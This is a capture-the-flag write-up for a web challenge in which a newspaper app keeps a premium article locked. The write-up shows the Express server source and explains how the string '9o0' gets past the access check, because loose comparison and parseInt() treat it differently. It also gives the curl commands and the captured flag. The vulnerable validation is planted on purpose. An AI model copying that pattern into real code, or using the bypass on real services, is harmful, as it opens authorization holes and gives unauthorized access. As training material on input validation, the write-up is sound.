# The Varsity [181 Solves]

## Description

> Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue.
> 
> Author: SteakEnthusiast
>
> `uoftctf-the-varsity.chals.io`
>
> Attachments: the_varsity.zip

## Source Code

```console
$ unzip -t the_varsity.zip
Archive:  the_varsity.zip
    testing: static/                  OK
    testing: static/css/              OK
    testing: static/css/index.css     OK
    testing: static/css/register.css   OK
    testing: static/js/               OK
    testing: static/js/index.js       OK
    testing: static/js/register.js    OK
    testing: views/                   OK
    testing: views/register.ejs       OK
    testing: views/user.ejs           OK
    testing: Dockerfile               OK
    testing: package.json             OK
    testing: server.js                OK
No errors detected in compressed data of the_varsity.zip.
```

<details><summary>server.js</summary>

```js
import express from "express";
import jwt from "jsonwebtoken";
import cookieParser from "cookie-parser";
import crypto from "crypto";
const FLAG = process.env.FLAG || "uoftctf{this_is_a_fake_flag}";
const app = express();
app.use(express.json());
app.use(cookieParser());
app.use(express.static("static"));
app.set("view engine", "ejs");

const JWT_SECRET = crypto.randomBytes(64).toString("hex");

const articles = [
  {
    "title": "Pioneering the Future: UofT's Revolutionary AI Research",
    "content": "The University of Toronto continues to lead groundbreaking research in artificial intelligence, with its latest project aiming to develop algorithms that can understand emotions in text. Spearheaded by a team of international students, this initiative promises to revolutionize how machines interact with human language."
  },
  {
    "title": "Engineering Triumph: UofT Students Build Record-Breaking Solar Car",
    "content": "A team of engineering students from the University of Toronto has broken international records with their latest solar-powered vehicle design. The car, named 'Solaris', is a testament to sustainable engineering and has won multiple awards in global competitions."
  },
  {
    "title": "UofT's Theatre Group Takes Centre Stage with Revolutionary Performance",
    "content": "The University of Toronto's theatre society has taken the art world by storm with its latest production, an innovative interpretation of Shakespeare's Hamlet. With a diverse cast and a unique, modern twist, the performance has garnered critical acclaim and a sold-out season."
  },
  {
    "title": "Medical Breakthrough: UofT Students Contribute to Cancer Research",
    "content": "In a significant stride towards fighting cancer, a group of biomedical students from the University of Toronto has contributed to major research findings. Their work focuses on a novel treatment approach that promises to reduce side effects and improve patient outcomes."
  },
  {
    "title": "Green Revolution: UofT's Commitment to Sustainability",
    "content": "The University of Toronto has launched a new initiative to make its campuses more sustainable. From reducing waste to promoting green technology, the university is dedicated to creating a better environment for students and the surrounding community."
  },
  {
    "title": "Cultural Mosaic: UofT's International Festival Highlights Global Unity",
    "content": "Celebrating diversity and unity, the University of Toronto's annual International Festival has once again brought together students from over 150 countries. The event featured cultural performances, food stalls, and interactive workshops, highlighting the rich cultural tapestry of the university's community."
  },
  {
    "title": "Tech Titans: UofT's Startup Accelerator Nurtures Next Generation Innovators",
    "content": "The University of Toronto's startup accelerator has become a hub for budding entrepreneurs. Offering mentorship, funding, and resources, the program has helped launch some of the most innovative tech companies in the country."
  },
  {
    "title": "Historic Discovery: UofT Archaeologists Unearth Ancient Artifacts",
    "content": "A team of archaeologists from the University of Toronto has made a historic discovery, unearthing ancient artifacts believed to be over 5,000 years old. This finding provides new insights into early human civilizations and has attracted international attention."
  },
  {
    "title": "Fitness First: UofT's New Wellness Program Promotes Student Health",
    "content": "With a focus on student well-being, the University of Toronto has introduced a comprehensive wellness program. Offering fitness classes, mental health resources, and nutritional guidance, the initiative aims to support the holistic health of all students."
  },
  {
    title: "UofT Hosts its 2nd Inaugural Capture the Flag Event",
    content: "Your flag is: " + FLAG,
  },
];

app.get("/", (req, res) => {
  const token = req.cookies.token;

  if (token) {
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      res.render("user", {
        username: decoded.username,
        subscription: decoded.subscription,
        articles: articles,
      });
    } catch (error) {
      res.clearCookie("token");
      res.redirect("/register");
    }
  } else {
    res.redirect("/register");
  }
});

app.get("/register", (req, res) => {
  res.render("register");
});

app.post("/register", (req, res) => {
  const { username, voucher } = req.body;

  if (
    typeof username === "string" &&
    (!voucher || typeof voucher === "string")
  ) {
    const subscription = voucher === FLAG + JWT_SECRET ? "premium" : "guest";
    if (voucher && subscription === "guest") {
      return res.status(400).json({ message: "Invalid voucher" });
    }
    const userToken = jwt.sign({ username, subscription }, JWT_SECRET, {
      expiresIn: "1d",
    });
    res.cookie("token", userToken, { httpOnly: true });
    return res.json({ message: "Registration successful", subscription });
  }

  return res.status(400).json({ message: "Invalid username or voucher" });
});

app.post("/article", (req, res) => {
  const token = req.cookies.token;

  if (token) {
    try {
      const decoded = jwt.verify(token, JWT_SECRET);

      let issue = req.body.issue;

      if (req.body.issue < 0) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      if (decoded.subscription !== "premium" && issue >= 9) {
        return res
          .status(403)
          .json({ message: "Please subscribe to access this issue" });
      }

      issue = parseInt(issue);

      if (Number.isNaN(issue) || issue > articles.length - 1) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      return res.json(articles[issue]);
    } catch (error) {
      res.clearCookie("token");
      return res.status(403).json({ message: "Not Authenticated" });
    }
  } else {
    return res.status(403).json({ message: "Not Authenticated" });
  }
});

app.listen(3000, () => {
  console.log("Server running on port 3000");
});
```

</details>

## Solution

### Initial Analysis

```js
const articles = [
  // (snip)
  {
    title: "UofT Hosts its 2nd Inaugural Capture the Flag Event",
    content: "Your flag is: " + FLAG,
  },
```

The flag is in the 10th element of the `articles` array (In 0-index, it's 9th element).

```js
app.post("/article", (req, res) => {
  const token = req.cookies.token;

  if (token) {
    try {
      const decoded = jwt.verify(token, JWT_SECRET);

      let issue = req.body.issue;

      if (req.body.issue < 0) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      if (decoded.subscription !== "premium" && issue >= 9) {
        return res
          .status(403)
          .json({ message: "Please subscribe to access this issue" });
      }

      issue = parseInt(issue);

      if (Number.isNaN(issue) || issue > articles.length - 1) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      return res.json(articles[issue]);
    } catch (error) {
      res.clearCookie("token");
      return res.status(403).json({ message: "Not Authenticated" });
    }
  } else {
    return res.status(403).json({ message: "Not Authenticated" });
  }
});
```

Since req.body.issue is not validated, we can send something other than a number.

If we can retrieve `articles[9]`, we can get the flag.
However, if the issue is 9 or greater, it will output `Please subscribe to access this issue.`
Since it retrieves articles[issue] after `parseInt`, so if we can send a request body that results in issue being 9 after `parseInt`, we can get the flag .

Octal numbers syntax (e.g. `0o1234`) is useful.

Tested `9o0` (not `0o9`) in Node.js console:

```js
> "9o0" >= 9  // Bypass `Please subscribe to access this issue`
false
> parseInt("9o0")
9
> Number.isNaN(parseInt("9o0"))  // Bypass `Invalid issue number`
false
```

### Exploit

```bash
curl -c cookies.txt -b cookies.txt https://uoftctf-the-varsity.chals.io/register -H "Content-Type: application/json" -d '{"username":"a","voucher":""}'
curl -c cookies.txt -b cookies.txt https://uoftctf-the-varsity.chals.io/article -H "Content-Type: application/json" -d '{"issue":"9o0"}'
```

Response:

```text
{"title":"UofT Hosts its 2nd Inaugural Capture the Flag Event","content":"Your flag is: uoftctf{w31rd_b3h4v10r_0f_parseInt()!}"} 
```

## Flag

uoftctf{w31rd_b3h4v10r_0f_parseInt()!}

## References

- [parseInt() - JavaScript \| MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt)
- [Numbers and dates - JavaScript \| MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Numbers_and_dates)
- [Node.js \| Report #1141623 - Unexpected input validation of octal literals in nodejs v15.12.0 and below returns defined values for all undefined octal literals. \| HackerOne](https://hackerone.com/reports/1141623)
